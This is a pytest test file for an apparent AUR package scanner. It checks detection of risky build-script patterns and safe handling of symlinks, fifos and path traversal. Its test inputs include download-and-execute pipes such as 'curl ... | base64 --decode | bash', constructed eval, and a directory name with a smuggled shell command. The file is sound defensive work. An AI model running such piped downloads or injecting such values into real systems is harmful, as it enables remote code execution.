"""Observable scanner outcomes, safe file handling and shared caller contracts."""
import os
import shutil
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest

from fettle.aur import buildscan, precheck
from fettle.backends.base import Context
from fettle.config import Config
from fettle.output import Output
from fettle.supplychain import aur_source
from fettle.supplychain.base import BUILD_LOGIC, UNVERIFIABLE, Severity

FIXTURES = Path(__file__).parent / 'fixtures/aur'


@pytest.mark.parametrize('text,rule,severity', [
    ('curl https://example.org/a | sh', 'download-shell', Severity.HIGH),
    ('wget -qO- https://example.org/a | bash', 'download-shell', Severity.HIGH),
    ('curl https://example.org/a \\\n | sh', 'download-shell', Severity.HIGH),
    ('printf x | base64 -d | sh', 'decode-shell', Severity.HIGH),
    ('curl https://example.org/a | base64 --decode | bash', 'download-decode-execute', Severity.CRITICAL),
    ('eval "$payload"', 'constructed-eval', Severity.MEDIUM),
    ('exec "$target"', 'constructed-exec', Severity.MEDIUM),
    ('base64 -d payload > data', 'encoded-content', Severity.LOW),
    ('./validator input', 'helper-provenance', Severity.LOW),
    (r"printf '\x61\x62\x63'", 'escaped-payload', Severity.MEDIUM),
    ('build() {\n sudo make install\n}', 'privileged-build', Severity.HIGH),
    ('package() {\n doas install app /usr/bin/app\n}', 'privileged-build', Severity.HIGH),
    *[(f'{tool} {verb}', 'js-dependencies', Severity.MEDIUM) for tool, verb in
      [('npm', 'ci'), ('bun', 'add'), ('pnpm', 'install'), ('yarn', 'install'), ('deno', 'cache')]],
])
def test_review_patterns(text, rule, severity):
    assert any(h.rule == rule and h.severity == severity for h in buildscan.scan_text(text))


def test_benign_fixture_has_complete_no_match_review():
    result = buildscan.scan_directory(FIXTURES / 'benign')
    assert not result.hits and not result.unavailable
    assert set(result.inspected) == {'PKGBUILD', 'sample.install', 'patch.diff'}


def test_positive_fixture_preserves_locations_and_severity():
    result = buildscan.scan_directory(FIXTURES / 'suspicious')
    assert not result.unavailable
    assert any(h.rule == 'download-decode-execute' and h.line == 6 for h in result.hits)
    assert any(h.file == 'review.install' and h.rule == 'constructed-eval' for h in result.hits)
    assert any(h.rule == 'source-host' and h.severity == Severity.LOW for h in result.hits)


def test_never_executes_build_or_install_scripts(tmp_path):
    marker = tmp_path / 'executed'
    (tmp_path / 'PKGBUILD').write_text(f'install=sample.install\ntouch {marker}\n')
    (tmp_path / 'sample.install').write_text(f'touch {marker}\n')
    result = buildscan.scan_directory(tmp_path)
    assert len(result.inspected) == 2
    assert not marker.exists()


@pytest.mark.parametrize('kind', ['missing', 'symlink', 'fifo', 'binary', 'oversized'])
def test_unavailable_input_is_never_clean(tmp_path, kind, capsys):
    path = tmp_path / 'PKGBUILD'
    if kind == 'symlink':
        real = tmp_path / 'real'
        real.write_text('pkgname=sample\n')
        path.symlink_to(real)
    elif kind == 'fifo':
        os.mkfifo(path)
    elif kind == 'binary':
        path.write_bytes(b'\xff')
    elif kind == 'oversized':
        path.write_text('x' * (buildscan.MAX_BYTES + 1))
    assert buildscan.main([str(tmp_path), '--no-color']) == 1
    output = capsys.readouterr().out
    assert 'could NOT' in output and 'no heuristic matched' not in output


def test_dynamic_sources_and_missing_install_are_coverage_gaps(tmp_path):
    (tmp_path / 'PKGBUILD').write_text('install=missing.install\nsource=("$generated")\n')
    result = buildscan.scan_directory(tmp_path)
    assert len(result.unavailable) == 2
    assert not result.hits


def test_source_traversal_and_symlink_are_refused(tmp_path):
    root = tmp_path / 'tree'
    root.mkdir()
    outside = tmp_path / 'outside'
    outside.write_bytes(b'\x7fELF')
    (root / 'link').symlink_to(outside)
    (root / 'PKGBUILD').write_text("source=('../outside' 'link')\n")
    result = buildscan.scan_directory(root)
    assert len(result.unavailable) == 2
    assert not result.hits


def test_large_local_elf_is_detected_without_reading_whole_binary(tmp_path):
    (tmp_path / 'PKGBUILD').write_text("source=('app')\n")
    (tmp_path / 'app').write_bytes(b'\x7fELF' + b'x' * (buildscan.MAX_BYTES + 1))
    result = buildscan.scan_directory(tmp_path)
    assert not result.unavailable
    assert result.hits[0].rule == 'local-elf'


def test_previous_tree_comparison_requires_readable_baseline(tmp_path):
    current, old = tmp_path / 'current', tmp_path / 'old'
    shutil.copytree(FIXTURES / 'benign', current)
    old.mkdir()
    assert any('comparison unavailable' in g for g in buildscan.scan_directory(current, previous=old).unavailable)
    (old / 'PKGBUILD').write_text('pkgname=sample\n')
    assert any(h.rule == 'new-install-script' for h in buildscan.scan_directory(current, previous=old).hits)
    (old / 'sample.install').write_text('')
    assert not buildscan.scan_directory(current, previous=old).hits


def test_malformed_urls_report_gap_without_crashing(tmp_path):
    (tmp_path / 'PKGBUILD').write_text("url='https://['\nsource=('https://[')\n")
    assert len(buildscan.scan_directory(tmp_path).unavailable) == 2


def test_unresolved_package_variable_is_not_replaced_with_empty_string(tmp_path):
    (tmp_path / 'PKGBUILD').write_text('pkgname=(one two)\nsource=("$pkgname")\n')
    result = buildscan.scan_directory(tmp_path)
    assert any('dynamic source' in g for g in result.unavailable)


def test_precheck_uses_same_engine_even_when_network_toggle_off(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv('AUR_PRECHECK', '0')
    with patch.object(precheck.aur_meta, 'fetch_info', side_effect=AssertionError('network must remain off')):
        assert precheck.main(['sample', '--build-dir', str(FIXTURES / 'suspicious')]) == 1
    lines = capsys.readouterr().out.splitlines()
    assert any(line.startswith('CRIT [Critical]') and 'download-decode-execute' in line for line in lines)
    assert any(line.startswith('WARN [Medium]') and 'constructed-eval' in line for line in lines)


def test_build_only_never_queries_metadata(capsys):
    with patch.object(precheck, 'check', side_effect=AssertionError('metadata must not run')):
        assert precheck.main(['sample', '--build-dir', str(FIXTURES / 'benign'), '--build-only']) == 0
    assert not capsys.readouterr().out


def test_missing_cache_is_unverifiable_and_cached_findings_are_shared(tmp_path):
    ioc = SimpleNamespace(bad_packages=lambda: set(), bad_accounts=lambda: set(),
                          bad_npm=lambda: set(), unavailable=[], stale=[])
    ctx = Context(output=Output(color=False), config=Config(), user_home=tmp_path, sudo_user='fixture')
    records = [{'Name': 'sample', 'PackageBase': 'sample', 'Maintainer': 'alice', 'LastModified': 9_999_999_999}]
    with patch.object(aur_source.aur_common, 'foreign_packages', return_value=['sample']), \
         patch.object(aur_source.aur_meta, 'query_info', return_value=records), \
         patch.object(aur_source.aur_common, 'ioc_feed', return_value=ioc):
        findings = aur_source.AURSource().findings(ctx)
        assert any(f.question == UNVERIFIABLE and 'no cached build tree' in f.detail for f in findings)
        shutil.copytree(FIXTURES / 'suspicious', tmp_path / '.cache/yay/sample')
        findings = aur_source.AURSource().findings(ctx)
        assert any(f.question == BUILD_LOGIC and f.severity == Severity.CRITICAL for f in findings)
        assert not any(f.package == 'build-inputs' for f in findings)


@pytest.mark.parametrize('network', ['1', '0'])
def test_lua_hook_passes_quoted_tree_to_shared_helper(tmp_path, network):
    import subprocess
    lua = shutil.which('lua')
    if not lua:
        pytest.skip('Lua interpreter not available')
    bindir = tmp_path / 'bin'
    bindir.mkdir()
    arguments = tmp_path / 'args'
    helper = bindir / 'fettle'
    helper.write_text('#!/bin/sh\nprintf "%s\\n" "$@" > "$HOOK_ARGS"\nprintf "WARN [High] review\\nCRIT [Critical] investigate\\n"\nexit 1\n')
    helper.chmod(0o755)
    script = tmp_path / 'hook-test.lua'
    hook = Path(__file__).resolve().parent.parent / 'contrib/yay-init.lua'
    # Exercise yay's callback contract using harmless synthetic data. Embedded
    # single quotes must survive the shell bridge without executing extra commands.
    directory = "tree'; touch SHOULD_NOT_EXIST; echo '"
    script.write_text('callbacks={}\nmessages={}\nyay={log={warn=function(m) table.insert(messages,m) end, error=function(m) table.insert(messages,m) end}, create_autocmd=function(n,t) callbacks[n]=t.callback end}\n'
                      + f'dofile("{hook}")\n'
                      + f'callbacks.AURPreInstall({{match="sample",data={{dir="{directory}"}}}})\n'
                      + 'assert(#messages == 4)\n')
    env = {**os.environ, 'PATH': str(bindir) + os.pathsep + os.environ['PATH'],
           'HOME': str(tmp_path), 'HOOK_ARGS': str(arguments), 'YAY_AUR_PRECHECK': network}
    env.pop('AUR_PRECHECK_BIN', None)
    run = subprocess.run([lua, str(script)], cwd=tmp_path, env=env, capture_output=True, text=True, timeout=10)
    assert run.returncode == 0, run.stderr
    assert arguments.read_text().splitlines() == ['aur-precheck', 'sample', '--build-dir', directory] + (['--build-only'] if network == '0' else [])
    assert not (tmp_path / 'SHOULD_NOT_EXIST').exists()
